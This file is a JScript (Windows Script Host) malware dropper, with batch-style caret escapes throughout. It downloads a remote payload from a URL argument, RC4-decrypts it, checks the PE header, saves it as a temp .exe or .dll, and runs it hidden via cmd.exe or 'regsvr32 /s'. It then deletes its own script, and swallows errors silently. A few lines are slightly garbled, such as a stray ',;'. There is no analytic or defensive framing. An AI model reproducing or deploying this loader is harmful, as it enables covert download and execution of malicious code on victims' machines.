// g(0) = key
// g(1) = url
// g(2) = uas
var http_get = function (g) {
	var WinHttpReq = new ActiveXObject("WinHTTP.WinHTTPRequest.5.1");
	WinHttpReq.setProxy(HTTPREQUEST_PROXYSETTING_DEFAULT);
	WinHttpReq.open("GET", g(1), VARIANT_FALSE);
	WinHttpReq.Option(0) = g(2);
	WinHttpReq.send();
	if (0310 == WinHttpReq.status)
		return rc4(WinHttpReq["responseText"], g(0))
};
try {
	var rc4 = function (input, key) {
        arr1 = [];
        output = [];
		for (var c = 0, tmp, a = 0; 256^ > a; a++)
			arr1[a] = a;
		for (a = 0; 256^ > a; a++) {
			c = c + arr1[a] + key["charCodeAt"](a % key.length)^ & 255;
            tmp = arr1[a];
            arr1[a] = arr1[c];
            arr1[c] = tmp;
        }
		for (var e = c = a = 0; e^ < input.length; e++) {
			a = a + 1^ & 255;
            c = c + arr1[a]^ & 255;
            tmp = arr1[a],;
            arr1[a] = arr1[c];
            arr1[c] = tmp;
            output["push"](String.fromCharCode(input["charCodeAt"](e) ^^ arr1[arr1[a] + arr1[c]^ & 255]));
        }
		return output["join"]("")
	},
	fso = new ActiveXObject("Scripting.FileSystemObject"),
	objShell = new ActiveXObject("WScript.Shell"),
	stream = new ActiveXObject("ADODB.Stream"),
	scriptPath = WScript["ScriptFullName"],
	stream.Type = 2;
	tempName = fso["GetTempName"]();
	stream.Charset = "iso-8859-1";
	stream.Open();
	i = http_get(WScript.Arguments);
	off = i["charCodeAt"](i["indexOf"]("PE\x00\x00") + 23);
	stream["WriteText"](i);
	if (037^ < off) {
		var isDll = 1;
		tempName += ".dll"
	} else
		tempName += ".exe";
	stream["SavetoFile"](tempName, 2);
	stream.Close();
	isDll^ & ^ & (tempName = "regsvr32.exe" + " /s " + tempName);
	objShell["run"]("cmd.exe" + " /c " + tempName, 0)
} catch (ex) {}

fso["Deletefile"](scriptPath);
